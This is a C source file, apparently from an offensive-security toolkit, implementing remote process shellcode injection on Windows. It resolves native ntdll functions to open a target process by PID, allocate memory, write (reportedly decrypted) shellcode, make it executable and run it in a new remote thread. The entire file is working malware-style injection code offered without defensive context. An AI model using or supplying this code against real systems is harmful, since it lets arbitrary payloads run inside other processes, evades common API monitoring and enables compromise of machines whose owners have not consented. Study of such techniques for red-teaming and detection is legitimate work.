#include "Box.h"

BOOL NtShellInjection(
	_In_ CONST DWORD PID,
	_In_ CONST PBYTE pShellcode,
	_In_ CONST SIZE_T sSizeofShellcode
)

{
	
	NTSTATUS		STATUS = NULL;
	HANDLE		  hProcess = NULL;
	HANDLE		   hThread = NULL;
	PVOID		   rBuffer = NULL;
	DWORD			   TID = NULL;
	BOOL             State = TRUE;
	DWORD       OldProtection = 0;
	SIZE_T       BytesWritten = 0;
	SIZE_T origSize = sSizeofShellcode;
	SIZE_T regionSize = sSizeofShellcode;
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);


	HMODULE ntdll = GetModuleHandleW(L"ntdll");

	// call these functions from ntdll.dll
	fn_NtOpenProcess NtOpenProcess = (fn_NtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
	fn_NtCreateThreadEx NtCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
	fn_NtAllocateVirtualMemory NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	fn_NtWriteVirtualMemory NtWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	fn_NtProtectVirtualMemory NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
	PFN_NtFreeVirtualMemory p_NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(ntdll, "NtFreeVirtualMemory");
	
	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtOpenProcess Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);

	// allocate SizeofShellcode to VirtualMemory
	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);

	// Write the newly decrypted shellcode inside
	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, pShellcode, origSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);

	// change permissions
	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &OldProtection);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Changed Allocation Protection from [RW] to [RE]");

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Created a Thread!", hThread);
	INFO("Waiting for Thread to finish executing...");
	WaitForSingleObject(hThread, INFINITE);
	INFO("Execution Completed! Cleaning Up!");

CLEANUP:


		if (rBuffer)
		{
			SIZE_T freeSize = 0;
			STATUS = p_NtFreeVirtualMemory(hProcess, &rBuffer, &freeSize, MEM_DECOMMIT);
			if (STATUS_SUCCESS != STATUS)
			{
				WARN("Error! Could Not Free Buffer! 0x%lx", STATUS);
			}
			else {
				INFO("[0x%p] decommitted allocated buffer from process memory", rBuffer);
			}
		}

		if (hThread) {
			CloseHandle(hThread);
			INFO("[0x%p] handle on thread closed", hThread);
		}

		if (hProcess) {
			CloseHandle(hProcess);
			INFO("[0x%p] handle on process closed", hProcess);
		}

		return State;
}